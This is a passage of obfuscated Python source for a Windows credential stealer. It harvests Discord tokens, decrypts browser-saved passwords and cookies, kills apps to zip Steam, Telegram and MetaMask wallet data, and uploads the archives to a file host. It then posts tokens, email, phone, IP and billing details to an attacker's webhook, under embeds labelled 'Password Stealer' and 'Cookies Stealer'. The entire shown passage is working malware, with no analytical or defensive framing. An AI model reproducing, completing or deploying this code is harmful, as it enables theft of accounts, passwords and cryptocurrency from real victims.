    OOOO00OO0OOOOO0O0 =O0OOOO0OOOO0O0OOO ["id"]#line:276
    OOO0OO0O0O00OO0OO =O0OOOO0OOOO0O0OOO ["avatar"]#line:277
    OOOOOO0O0OOO000O0 =O0OOOO0OOOO0O0OOO ["public_flags"]#line:278
    O0O0O00OO0000OOOO =""#line:279
    O00OO0O00O00OOO00 =""#line:280
    if "premium_type"in O0OOOO0OOOO0O0OOO :#line:282
        O0O000O0OO000000O =O0OOOO0OOOO0O0OOO ["premium_type"]#line:283
        if O0O000O0OO000000O ==1 :#line:284
            O0O0O00OO0000OOOO ="<a:DE_BadgeNitro:865242433692762122>"#line:285
        elif O0O000O0OO000000O ==2 :#line:286
            O0O0O00OO0000OOOO ="<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>"#line:287
    if "ph0n3"in O0OOOO0OOOO0O0OOO :O00OO0O00O00OOO00 =f'{O0OOOO0OOOO0O0OOO["ph0n3"]}'#line:288
    return OO0O000OO00OOOOOO ,OO00000OOOOOO000O ,OO0O0O0O00O0O0OO0 ,OOOO00OO0OOOOO0O0 ,OOO0OO0O0O00OO0OO ,OOOOOO0O0OOO000O0 ,O0O0O00OO0000OOOO ,O00OO0O00O00OOO00 #line:290
def ch1ckT4k1n (O00OO00O00000OOOO ):#line:292
    O000000OO00OO0OOO ={"Authorization":O00OO00O00000OOOO ,"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:297
    try :#line:298
        urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =O000000OO00OO0OOO ))#line:299
        return True #line:300
    except :#line:301
        return False #line:302
def upl05dT4k31 (OO0OOOO0O0OOO00O0 ,O0O00OO00OOO00OOO ):#line:304
    global IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO #line:305
    O000000O0O00OOO0O ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:309
    O0OO0O000OOO0OOOO ,OOOOO0O00O000000O ,OO0O00O0O0O00O0OO ,OOO0OO0O00OOOO0OO ,O0O0OO00O0O0O00O0 ,O0OO0000O00OO0O00 ,O0O00O00000OOO000 ,O0O0O0OO000OOO00O =G3tT0k4n1nf9 (OO0OOOO0O0OOO00O0 )#line:310
    if O0O0OO00O0O0O00O0 ==None :#line:312
        O0O0OO00O0O0O00O0 =""#line:313
    else :#line:314
        O0O0OO00O0O0O00O0 =f"https://cdn.discordapp.com/avatars/{OOO0OO0O00OOOO0OO}/{O0O0OO00O0O0O00O0}"#line:315
    O0OO00000O000OO0O =G3tb1ll1ng (OO0OOOO0O0OOO00O0 )#line:317
    OOOO0OOOO0000O0O0 =G3tB4dg31 (O0OO0000O00OO0O00 )#line:318
    O0OO0OOO00O0000O0 =G3tUHQFr13ndS (OO0OOOO0O0OOO00O0 )#line:319
    if O0OO0OOO00O0000O0 =='':O0OO0OOO00O0000O0 ="```No Rare Friends```"#line:320
    if not O0OO00000O000OO0O :#line:321
        OOOO0OOOO0000O0O0 ,O0O0O0OO000OOO00O ,O0OO00000O000OO0O ="🔒","🔒","🔒"#line:322
    if O0O00O00000OOO000 ==''and OOOO0OOOO0000O0O0 =='':O0O00O00000OOO000 ="```None```"#line:323
    O000O00O0OOOO00OO ={"content":f'{globalInfo()} | `{O0O00OO00OOO00OOO}`',"embeds":[{"color":2895667 ,"fields":[{"name":"<a:hyperNOPPERS:828369518199308388> Token:","value":f"```{OO0OOOO0O0OOO00O0}```","inline":True },{"name":"<:mail:750393870507966486> Email:","value":f"```{OO0O00O0O0O00O0OO}```","inline":True },{"name":"<a:1689_Ringing_Phone:755219417075417088> Phone:","value":f"```{O0O0O0OO000OOO00O}```","inline":True },{"name":"<:mc_earth:589630396476555264> IP:","value":f"```{g3t1p()}```","inline":True },{"name":"<:woozyface:874220843528486923> Badges:","value":f"{O0O00O00000OOO000}{OOOO0OOOO0000O0O0}","inline":True },{"name":"<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:","value":f"{O0OO00000O000OO0O}","inline":True },{"name":"<a:mavikirmizi:853238372591599617> HQ Friends:","value":f"{O0OO0OOO00O0000O0}","inline":False }],"author":{"name":f"{O0OO0O000OOO0OOOO}#{OOOOO0O00O000000O} ({OOO0OO0O00OOOO0OO})","icon_url":f"{O0O0OO00O0O0O00O0}"},"footer":{"text":"unknown","icon_url":""},"thumbnail":{"url":f"{O0O0OO00O0O0O00O0}"}}],"avatar_url":"","username":"unknown","attachments":[]}#line:383
    L04durl1b (IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO ,data =dumps (O000O00O0OOOO00OO ).encode (),headers =O000000O0O00OOO0O )#line:384
def R4f0rm3t (O00000OOOO000O000 ):#line:387
    OOO00OO000O00O00O =re .findall ("(\w+[a-z])",O00000OOOO000O000 )#line:388
    while "https"in OOO00OO000O00O00O :OOO00OO000O00O00O .remove ("https")#line:389
    while "com"in OOO00OO000O00O00O :OOO00OO000O00O00O .remove ("com")#line:390
    while "net"in OOO00OO000O00O00O :OOO00OO000O00O00O .remove ("net")#line:391
    return list (set (OOO00OO000O00O00O ))#line:392
def upload (O00OO0O0O0O00000O ,OO00O00O0O00000OO ):#line:394
    O0O000OO0000O000O ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:398
    if O00OO0O0O0O00000O =="crcook":#line:400
        O00O0O000OO00OO00 =' | '.join (OOOO0OO0O00O0OOOO for OOOO0OO0O00O0OOOO in cookiWords )#line:401
        if len (O00O0O000OO00OO00 )>1000 :#line:402
            O0O0OOO000000OOO0 =R4f0rm3t (str (cookiWords ))#line:403
            O00O0O000OO00OO00 =' | '.join (OO0O0O00O000000O0 for OO0O0O00O000000O0 in O0O0OOO000000OOO0 )#line:404
        OOO0000OOOO0000O0 ={"content":f"{globalInfo()}","embeds":[{"title":"unknown | Cookies Stealer","description":f"<:apollondelirmis:1012370180845883493>: **Accounts:**\n\n{O00O0O000OO00OO00}\n\n**Data:**\n<:cookies_tlm:816619063618568234> • **{CookiCount}** Cookies Found\n<a:CH_IconArrowRight:715585320178941993> • [unknownCookies.txt]({OO00O00O0O00000OO})","color":2895667 ,"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg","attachments":[]}#line:421
        L04durl1b (IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO ,data =dumps (OOO0000OOOO0000O0 ).encode (),headers =O0O000OO0000O000O )#line:422
        return #line:423
    if O00OO0O0O0O00000O =="crpassw":#line:425
        OOOO0OOOOO0O0OOO0 =' | '.join (OOO0OO00O00O0OO0O for OOO0OO00O00O0OO0O in paswWords )#line:426
        if len (OOOO0OOOOO0O0OOO0 )>1000 :#line:427
            OOOO00O00000OOO00 =R4f0rm3t (str (paswWords ))#line:428
            OOOO0OOOOO0O0OOO0 =' | '.join (O0O0OOO0000O0O0O0 for O0O0OOO0000O0O0O0 in OOOO00O00000OOO00 )#line:429
        OOO0000OOOO0000O0 ={"content":f"{globalInfo()}","embeds":[{"title":"unknown | Password Stealer","description":f"<:apollondelirmis:1012370180845883493>: **Accounts**:\n{OOOO0OOOOO0O0OOO0}\n\n**Data:**\n<a:hira_kasaanahtari:886942856969875476> • **{P4sswCount}** Passwords Found\n<a:CH_IconArrowRight:715585320178941993> • [unknownPassword.txt]({OO00O00O0O00000OO})","color":2895667 ,"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"","attachments":[]}#line:447
        L04durl1b (IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO ,data =dumps (OOO0000OOOO0000O0 ).encode (),headers =O0O000OO0000O000O )#line:448
        return #line:449
    if O00OO0O0O0O00000O =="kiwi":#line:451
        OOO0000OOOO0000O0 ={"content":f"{globalInfo()}","embeds":[{"color":2895667 ,"fields":[{"name":"Interesting files found on user PC:","value":OO00O00O0O00000OO }],"author":{"name":"unknown | File Stealer"},"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"","attachments":[]}#line:475
        L04durl1b (IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO ,data =dumps (OOO0000OOOO0000O0 ).encode (),headers =O0O000OO0000O000O )#line:476
        return #line:477
    _ #line:490
def wr1tef0rf1l3 (OO00OOO0O0O000O00 ,O000O00OO00OO00OO ):#line:495
    O0OOOO0OOOOOO0OO0 =os .getenv ("TEMP")+f"\cr{O000O00OO00OO00OO}.txt"#line:496
    with open (O0OOOO0OOOOOO0OO0 ,mode ='w',encoding ='utf-8')as OOOO0OO00OO00O0O0 :#line:497
        OOOO0OO00OO00O0O0 .write (f"<--unknown BEST -->\n\n")#line:498
        for OOOOO0O0OO00O0OOO in OO00OOO0O0O000O00 :#line:499
            if OOOOO0O0OO00O0OOO [0 ]!='':#line:500
                OOOO0OO00OO00O0O0 .write (f"{OOOOO0O0OO00O0OOO}\n")#line:501
T0k3ns =''#line:503
def getT0k3n (O0O000OO0OO0O0O00 ,O00O000OOO00O000O ):#line:504
    if not os .path .exists (O0O000OO0OO0O0O00 ):return #line:505
    O0O000OO0OO0O0O00 +=O00O000OOO00O000O #line:507
    for O00000O0000O000O0 in os .listdir (O0O000OO0OO0O0O00 ):#line:508
        if O00000O0000O000O0 .endswith (".log")or O00000O0000O000O0 .endswith (".ldb"):#line:509
            for O00OOOO000OOO0O0O in [OO000O0OOOOOOO0O0 .strip ()for OO000O0OOOOOOO0O0 in open (f"{O0O000OO0OO0O0O00}\\{O00000O0000O000O0}",errors ="ignore").readlines ()if OO000O0OOOOOOO0O0 .strip ()]:#line:510
                for O0O00O00OOO0O000O in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}",r"mfa\.[\w-]{80,95}"):#line:511
                    for OOOO00000OOOOOO00 in re .findall (O0O00O00OOO0O000O ,O00OOOO000OOO0O0O ):#line:512
                        global T0k3ns #line:513
                        if ch1ckT4k1n (OOOO00000OOOOOO00 ):#line:514
                            if not OOOO00000OOOOOO00 in T0k3ns :#line:515
                                T0k3ns +=OOOO00000OOOOOO00 #line:517
                                upl05dT4k31 (OOOO00000OOOOOO00 ,O0O000OO0OO0O0O00 )#line:518
P4ssw =[]#line:520
def getP4ssw (O0OO000OOO0O0O00O ,OO00O000OOOO0OOO0 ):#line:521
    global P4ssw ,P4sswCount #line:522
    if not os .path .exists (O0OO000OOO0O0O00O ):return #line:523
    OOOOOOO00O0O0O0OO =O0OO000OOO0O0O00O +OO00O000OOOO0OOO0 +"/Login Data"#line:525
    if os .stat (OOOOOOO00O0O0O0OO ).st_size ==0 :return #line:526
    OOO0O0000O0OO0OO0 =temp +"cr"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for O0O000O0O000OO0OO in range (8 ))+".db"#line:528
    shutil .copy2 (OOOOOOO00O0O0O0OO ,OOO0O0000O0OO0OO0 )#line:530
    O00O0O0O0OO0OOOO0 =sql_connect (OOO0O0000O0OO0OO0 )#line:531
    O0OO00OO0OO0O0OO0 =O00O0O0O0OO0OOOO0 .cursor ()#line:532
    O0OO00OO0OO0O0OO0 .execute ("SELECT action_url, username_value, password_value FROM logins;")#line:533
    OOOOOOOOO000000OO =O0OO00OO0OO0O0OO0 .fetchall ()#line:534
    O0OO00OO0OO0O0OO0 .close ()#line:535
    O00O0O0O0OO0OOOO0 .close ()#line:536
    os .remove (OOO0O0000O0OO0OO0 )#line:537
    OOOOO0O0O000OO00O =O0OO000OOO0O0O00O +"/Local State"#line:539
    with open (OOOOO0O0O000OO00O ,'r',encoding ='utf-8')as O00OO0000O000O00O :OO00OOOO0O00O0O00 =json_loads (O00OO0000O000O00O .read ())#line:540
    O0OOOO00O0000O0OO =b64decode (OO00OOOO0O00O0O00 ['os_crypt']['encrypted_key'])#line:541
    O0OOOO00O0000O0OO =CryptUnprotectData (O0OOOO00O0000O0OO [5 :])#line:542
    for O00OO00O0O00OO0O0 in OOOOOOOOO000000OO :#line:544
        if O00OO00O0O00OO0O0 [0 ]!='':#line:545
            for OO00OO0000O0O0O00 in keyword :#line:546
                OO0O0O0OOOOO00O0O =OO00OO0000O0O0O00 #line:547
                if "https"in OO00OO0000O0O0O00 :#line:548
                    OO000000000OO0000 =OO00OO0000O0O0O00 #line:549
                    OO00OO0000O0O0O00 =OO000000000OO0000 .split ('[')[1 ].split (']')[0 ]#line:550
                if OO00OO0000O0O0O00 in O00OO00O0O00OO0O0 [0 ]:#line:551
                    if not OO0O0O0OOOOO00O0O in paswWords :paswWords .append (OO0O0O0OOOOO00O0O )#line:552
            P4ssw .append (f"UR1: {O00OO00O0O00OO0O0[0]} | U53RN4M3: {O00OO00O0O00OO0O0[1]} | P455W0RD: {D3kryptV4lU3(O00OO00O0O00OO0O0[2], O0OOOO00O0000O0OO)}")#line:553
            P4sswCount +=1 #line:554
    wr1tef0rf1l3 (P4ssw ,'passw')#line:555
C00k13 =[]#line:557
def getC00k13 (O00000O00O00O0O00 ,OO0O0O0O0O00OO000 ):#line:558
    global C00k13 ,CookiCount #line:559
    if not os .path .exists (O00000O00O00O0O00 ):return #line:560
    OOOOOO0OO0O000000 =O00000O00O00O0O00 +OO0O0O0O0O00OO000 +"/Cookies"#line:562
    if os .stat (OOOOOO0OO0O000000 ).st_size ==0 :return #line:563
    OOOO0O000O0O00OOO =temp +"cr"+''.join (random .choice ('bcdefghijklmnopqrstuvwxyz')for OO00OOO0O0OO0000O in range (8 ))+".db"#line:565
    shutil .copy2 (OOOOOO0OO0O000000 ,OOOO0O000O0O00OOO )#line:567
    O00OOO0OO000OO0O0 =sql_connect (OOOO0O000O0O00OOO )#line:568
    OO0OOO0000O0O0OO0 =O00OOO0OO000OO0O0 .cursor ()#line:569
    OO0OOO0000O0O0OO0 .execute ("SELECT host_key, name, encrypted_value FROM cookies")#line:570
    O0O0O0O000O0000O0 =OO0OOO0000O0O0OO0 .fetchall ()#line:571
    OO0OOO0000O0O0OO0 .close ()#line:572
    O00OOO0OO000OO0O0 .close ()#line:573
    os .remove (OOOO0O000O0O00OOO )#line:574
    OOOO000O0OOOOO0O0 =O00000O00O00O0O00 +"/Local State"#line:576
    with open (OOOO000O0OOOOO0O0 ,'r',encoding ='utf-8')as O0O000O0000OOO00O :OO000OOOO0OOO0O0O =json_loads (O0O000O0000OOO00O .read ())#line:578
    OO0O0O00000O0O0O0 =b64decode (OO000OOOO0OOO0O0O ['os_crypt']['encrypted_key'])#line:579
    OO0O0O00000O0O0O0 =CryptUnprotectData (OO0O0O00000O0O0O0 [5 :])#line:580
    for OO0O0OO00O0O000OO in O0O0O0O000O0000O0 :#line:582
        if OO0O0OO00O0O000OO [0 ]!='':#line:583
            for OO0000O00O0O0000O in keyword :#line:584
                OO0OO0OOOO0O0OOOO =OO0000O00O0O0000O #line:585
                if "https"in OO0000O00O0O0000O :#line:586
                    OOOOOOO00O000O000 =OO0000O00O0O0000O #line:587
                    OO0000O00O0O0000O =OOOOOOO00O000O000 .split ('[')[1 ].split (']')[0 ]#line:588
                if OO0000O00O0O0000O in OO0O0OO00O0O000OO [0 ]:#line:589
                    if not OO0OO0OOOO0O0OOOO in cookiWords :cookiWords .append (OO0OO0OOOO0O0OOOO )#line:590
            C00k13 .append (f"{OO0O0OO00O0O000OO[0]}	TRUE	/	FALSE	2597573456	{OO0O0OO00O0O000OO[1]}	{D3kryptV4lU3(OO0O0OO00O0O000OO[2], OO0O0O00000O0O0O0)}")#line:591
            CookiCount +=1 #line:592
    wr1tef0rf1l3 (C00k13 ,'cook')#line:593
def G3tD1sc0rd (OO00O0OO0O0OO0000 ,OO00O0O00000OO0O0 ):#line:595
    if not os .path .exists (f"{OO00O0OO0O0OO0000}/Local State"):return #line:596
    O0OO0OO0O00O00OO0 =OO00O0OO0O0OO0000 +OO00O0O00000OO0O0 #line:598
    OOO00OOO0O00OOOO0 =OO00O0OO0O0OO0000 +"/Local State"#line:600
    with open (OOO00OOO0O00OOOO0 ,'r',encoding ='utf-8')as O00OO0O0O0OOO00O0 :OOO00OO0OO0O00O00 =json_loads (O00OO0O0O0OOO00O0 .read ())#line:601
    OO0OO0OO00O0O00O0 =b64decode (OOO00OO0OO0O00O00 ['os_crypt']['encrypted_key'])#line:602
    OO0OO0OO00O0O00O0 =CryptUnprotectData (OO0OO0OO00O0O00O0 [5 :])#line:603
    for OOOO0OO00O00O0O00 in os .listdir (O0OO0OO0O00O00OO0 ):#line:606
        if OOOO0OO00O00O0O00 .endswith (".log")or OOOO0OO00O00O0O00 .endswith (".ldb"):#line:608
            for O0O00O000O0O00OO0 in [OOOOO0O000O00OOO0 .strip ()for OOOOO0O000O00OOO0 in open (f"{O0OO0OO0O00O00OO0}\\{OOOO0OO00O00O0O00}",errors ="ignore").readlines ()if OOOOO0O000O00OOO0 .strip ()]:#line:609
                for O000OO000O00O00O0 in re .findall (r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*",O0O00O000O0O00OO0 ):#line:610
                    global T0k3ns #line:611
                    O00O00O00000O0O0O =D3kryptV4lU3 (b64decode (O000OO000O00O00O0 .split ('dQw4w9WgXcQ:')[1 ]),OO0OO0OO00O0O00O0 )#line:612
                    if ch1ckT4k1n (O00O00O00000O0O0O ):#line:613
                        if not O00O00O00000O0O0O in T0k3ns :#line:614
                            T0k3ns +=O00O00O00000O0O0O #line:616
                            upl05dT4k31 (O00O00O00000O0O0O ,OO00O0OO0O0OO0000 )#line:618
def GatherZips (OOOO0O0O0O000OOO0 ,OOOOO0OOO00O0OOO0 ,O00000OO0O00000OO ):#line:620
    OO000O00O0000OOO0 =[]#line:621
    for OOO00O00O0OO0O000 in OOOO0O0O0O000OOO0 :#line:622
        O0OOOO0000OO000O0 =threading .Thread (target =Z1pTh1ngs ,args =[OOO00O00O0OO0O000 [0 ],OOO00O00O0OO0O000 [5 ],OOO00O00O0OO0O000 [1 ]])#line:623
        O0OOOO0000OO000O0 .start ()#line:624
        OO000O00O0000OOO0 .append (O0OOOO0000OO000O0 )#line:625
    for OOO00O00O0OO0O000 in OOOOO0OOO00O0OOO0 :#line:627
        O0OOOO0000OO000O0 =threading .Thread (target =Z1pTh1ngs ,args =[OOO00O00O0OO0O000 [0 ],OOO00O00O0OO0O000 [2 ],OOO00O00O0OO0O000 [1 ]])#line:628
        O0OOOO0000OO000O0 .start ()#line:629
        OO000O00O0000OOO0 .append (O0OOOO0000OO000O0 )#line:630
    O0OOOO0000OO000O0 =threading .Thread (target =ZipTelegram ,args =[O00000OO0O00000OO [0 ],O00000OO0O00000OO [2 ],O00000OO0O00000OO [1 ]])#line:632
    O0OOOO0000OO000O0 .start ()#line:633
    OO000O00O0000OOO0 .append (O0OOOO0000OO000O0 )#line:634
    for OO00O000O000O000O in OO000O00O0000OOO0 :#line:636
        OO00O000O000O000O .join ()#line:637
    global WalletsZip ,GamingZip ,OtherZip #line:638
    OOOO0OO0O00O0OOO0 ,O0OO0OO0O0OOO0000 ,OOO0O0OO00O0OO0O0 ="",'',''#line:641
    if not len (WalletsZip )==0 :#line:642
        OOOO0OO0O00O0OOO0 =":coin:  •  Wallets\n"#line:643
        for O0O0O0O0O00O0O000 in WalletsZip :#line:644
            OOOO0OO0O00O0OOO0 +=f"└─ [{O0O0O0O0O00O0O000[0]}]({O0O0O0O0O00O0O000[1]})\n"#line:645
    if not len (WalletsZip )==0 :#line:646
        O0OO0OO0O0OOO0000 =":video_game:  •  Gaming:\n"#line:647
        for O0O0O0O0O00O0O000 in GamingZip :#line:648
            O0OO0OO0O0OOO0000 +=f"└─ [{O0O0O0O0O00O0O000[0]}]({O0O0O0O0O00O0O000[1]})\n"#line:649
    if not len (OtherZip )==0 :#line:650
        OOO0O0OO00O0OO0O0 =":tickets:  •  Apps\n"#line:651
        for O0O0O0O0O00O0O000 in OtherZip :#line:652
            OOO0O0OO00O0OO0O0 +=f"└─ [{O0O0O0O0O00O0O000[0]}]({O0O0O0O0O00O0O000[1]})\n"#line:653
    OO0OO0O0OO000OOO0 ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}#line:657
    O0O00000O0000O0O0 ={"content":globalInfo (),"embeds":[{"title":"unknown Zips","description":f"{OOOO0OO0O00O0OOO0}\n{O0OO0OO0O0OOO0000}\n{OOO0O0OO00O0OO0O0}","color":2895667 ,"footer":{"text":"unknown","icon_url":""}}],"username":"unknown","avatar_url":"","attachments":[]}#line:675
    L04durl1b (IOioiOOioOIOoooIOIoioIOIOioIOioiOIOIOioIOIOIOioioIOIOIOioioIOIoioioOIOioioIOOOiooOIIIIIIIIOOi0o0i0o0ioOo0IOOIOoioiOIO00O0o0o0o0o0OOOO0o0o0oOOO0o0o0oOOO0o0o0o0OOOOo0o0o0o0oOOOo0o00ooOOOO00o0ooOOO0o0o0o0oOOO0o0o0o0OOOooo00o0oOOOo00o0ooOOoo00o0o0OOO0o0oOOO ,data =dumps (O0O00000O0000O0O0 ).encode (),headers =OO0OO0O0OO000OOO0 )#line:676
def ZipTelegram (OO0O0OOO0O0OO000O ,OOO00OOO00O00OOOO ,O000000OO00OO000O ):#line:679
    global OtherZip #line:680
    O0OO0O0OO000OOO0O =OO0O0OOO0O0OO000O #line:681
    O0000O0OOO0O0OO0O =OOO00OOO00O00OOOO #line:682
    if not os .path .exists (O0OO0O0OO000OOO0O ):return #line:683
    subprocess .Popen (f"taskkill /im {O000000OO00OO000O} /t /f >nul 2>&1",shell =True )#line:684
    OOOOOO0O00O00OOOO =ZipFile (f"{O0OO0O0OO000OOO0O}/{O0000O0OOO0O0OO0O}.zip","w")#line:686
    for OO0O0OO0000OO0O00 in os .listdir (O0OO0O0OO000OOO0O ):#line:687
        if not ".zip"in OO0O0OO0000OO0O00 and not "tdummy"in OO0O0OO0000OO0O00 and not "user_data"in OO0O0OO0000OO0O00 and not "webview"in OO0O0OO0000OO0O00 :#line:688
            OOOOOO0O00O00OOOO .write (O0OO0O0OO000OOO0O +"/"+OO0O0OO0000OO0O00 )#line:689
    OOOOOO0O00O00OOOO .close ()#line:690
    OOOOO00OOO00OO0O0 =uploadToAnonfiles (f'{O0OO0O0OO000OOO0O}/{O0000O0OOO0O0OO0O}.zip')#line:692
    os .remove (f"{O0OO0O0OO000OOO0O}/{O0000O0OOO0O0OO0O}.zip")#line:693
    OtherZip .append ([OOO00OOO00O00OOOO ,OOOOO00OOO00OO0O0 ])#line:694
def Z1pTh1ngs (O0OOO0O0OO0O0O000 ,OO000O0OOO00O0000 ,OO00O0000O00OOOOO ):#line:696
    OO0OO000000O0OOOO =O0OOO0O0OO0O0O000 #line:697
    OO00000OOO00OO0OO =OO000O0OOO00O0000 #line:698
    global WalletsZip ,GamingZip ,OtherZip #line:699
    if "nkbihfbeogaeaoehlefnkodbefgpgknn"in OO000O0OOO00O0000 :#line:701
        OO0O00OOOOOO000O0 =O0OOO0O0OO0O0O000 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:702
        OO00000OOO00OO0OO =f"Metamask_{OO0O00OOOOOO000O0}"#line:703
        OO0OO000000O0OOOO =O0OOO0O0OO0O0O000 +OO000O0OOO00O0000 #line:704
    if not os .path .exists (OO0OO000000O0OOOO ):return #line:706
    subprocess .Popen (f"taskkill /im {OO00O0000O00OOOOO} /t /f >nul 2>&1",shell =True )#line:707
    if "Wallet"in OO000O0OOO00O0000 or "NationsGlory"in OO000O0OOO00O0000 :#line:709
        OO0O00OOOOOO000O0 =O0OOO0O0OO0O0O000 .split ("\\")[4 ].split ("/")[1 ].replace (' ','')#line:710
        OO00000OOO00OO0OO =f"{OO0O00OOOOOO000O0}"#line:711
    elif "Steam"in OO000O0OOO00O0000 :#line:713
        if not os .path .isfile (f"{OO0OO000000O0OOOO}/loginusers.vdf"):return #line:714
        OOO000OO0O0000000 =open (f"{OO0OO000000O0OOOO}/loginusers.vdf","r+",encoding ="utf8")#line:715
        OO0000O0OOO0O0000 =OOO000OO0O0000000 .readlines ()#line:716
        O000OOO00O0000OOO =False #line:717
        for O0OO00OO0OOOOOOOO in OO0000O0OOO0O0000 :#line:718
            if 'RememberPassword"\t\t"1"'in O0OO00OO0OOOOOOOO :#line:719
                O000OOO00O0000OOO =True #line:720
        if O000OOO00O0000OOO ==False :return #line:721
        OO00000OOO00OO0OO =OO000O0OOO00O0000 #line:722
    O000O0OO0O00OO0OO =ZipFile (f"{OO0OO000000O0OOOO}/{OO00000OOO00OO0OO}.zip","w")#line:725
    for O000O0O00O0O00OO0 in os .listdir (OO0OO000000O0OOOO ):#line:726
        if not ".zip"in O000O0O00O0O00OO0 :O000O0OO0O00OO0OO .write (OO0OO000000O0OOOO +"/"+O000O0O00O0O00OO0 )#line:727
    O000O0OO0O00OO0OO .close ()#line:728
    OOOOO0O0OOO00OOO0 =uploadToAnonfiles (f'{OO0OO000000O0OOOO}/{OO00000OOO00OO0OO}.zip')#line:730
    os .remove (f"{OO0OO000000O0OOOO}/{OO00000OOO00OO0OO}.zip")#line:731
    if "Wallet"in OO000O0OOO00O0000 or "eogaeaoehlef"in OO000O0OOO00O0000 :#line:733
        WalletsZip .append ([OO00000OOO00OO0OO ,OOOOO0O0OOO00OOO0 ])#line:734
    elif "NationsGlory"in OO00000OOO00OO0OO or "Steam"in OO00000OOO00OO0OO or "RiotCli"in OO00000OOO00OO0OO :#line:735
        GamingZip .append ([OO00000OOO00OO0OO ,OOOOO0O0OOO00OOO0 ])#line:736
    else :#line:737
        OtherZip .append ([OO00000OOO00OO0OO ,OOOOO0O0OOO00OOO0 ])#line:738
def GatherAll ():#line:741
    ""#line:742
    OOOOOOO00OOOO0OO0 =[[f"{roaming}/Opera Software/Opera GX Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Stable","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{roaming}/Opera Software/Opera Neon/User Data/Default","opera.exe","/Local Storage/leveldb","/","/Network","/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Google/Chrome SxS/User Data","chrome.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/BraveSoftware/Brave-Browser/User Data","brave.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Yandex/YandexBrowser/User Data","yandex.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn"],[f"{local}/Microsoft/Edge/User Data","edge.exe","/Default/Local Storage/leveldb","/Default","/Default/Network","/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"]]#line:752
    O0OO0O0O0OOOO0OOO =[[f"{roaming}/Discord","/Local Storage/leveldb"],[f"{roaming}/Lightcord","/Local Storage/leveldb"],[f"{roaming}/discordcanary","/Local Storage/leveldb"],[f"{roaming}/discordptb","/Local Storage/leveldb"],]#line:759
